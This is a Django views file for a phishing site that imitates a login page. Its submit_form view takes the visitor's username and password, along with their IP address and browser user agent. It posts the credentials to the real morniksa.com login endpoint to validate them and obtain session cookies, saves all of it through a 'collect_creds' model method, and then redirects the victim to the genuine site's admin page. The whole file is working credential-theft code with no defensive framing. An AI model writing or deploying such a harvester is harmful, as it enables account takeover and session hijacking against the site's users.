import json
import os
import sys
import pprint

from django.shortcuts import render, redirect
from django.http import HttpResponse, HttpResponseRedirect

import requests
# import click

from .models import UserInfo
# Create your views here.


pp = pprint.PrettyPrinter(indent=4)

def home_view(request, *args, **kwargs):
    print(args, kwargs)
    print(request.user)
    # return HttpResponse("<h1>Hello World</h1>")
    return render(request, "home.html", {})

def login_view(request, *args, **kwargs):
    # return HttpResponse("<h1>contact page</h1>")
    return render(request, "login.html", {})

def submit_form(request, *args, **kwargs):
    print (request)
    user_name  = request.POST['username']
    password   = request.POST['password']
    user_agent = request.META['HTTP_USER_AGENT']
    user_ip    = request.META['REMOTE_ADDR']

    pp.pprint(user_name)
    # pp.pprint(password)
    pp.pprint(user_agent)
    pp.pprint(user_ip)
    # pp.pprint(request.__dict__)

    # user_name = request.POST['data']['username']
    # password = request.POST['data']['password']
    # info = UserInfo()
    # info.collect_creds(user_name, password, user_agent, user_ip, Cookies)

    payload = {'user_session[username]': user_name, 'user_session[password][]': password}
    r = requests.post('https://www.morniksa.com/user_sessions?locale=en&__amp_source_origin=https://www.morniksa.com', data = payload)
    Response_headers = r.headers
    Response_content = r.__dict__
    content_msg      = r._content
    cookies          = r.cookies
    # pp.pprint(Response_headers)
    # pp.pprint(Response_content)
    # pp.pprint(Content_msg )
    pp.pprint(cookies)

    info = UserInfo()
    info.collect_creds(user_name, password, user_agent, user_ip, cookies)

    # payload = {
    # user_sessions['username']:user_name,}
    # r = requests.post('https://www.morniksa.com/user_session/', payload=payload)

    # return render(request, "home.html", {})
    return HttpResponseRedirect("https://www.morniksa.com/admin?locale=en")
